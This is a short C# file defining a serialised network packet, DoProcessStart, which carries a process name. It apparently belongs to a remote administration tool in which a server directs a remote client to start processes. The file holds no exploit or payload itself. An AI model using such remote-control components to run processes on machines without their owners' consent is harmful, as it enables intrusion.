using ProtoBuf;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class DoProcessStart : IPacket
    {
        [ProtoMember(1)]
        public string Processname { get; set; }

        public DoProcessStart()
        {
        }

        public DoProcessStart(string processname)
        {
            this.Processname = processname;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}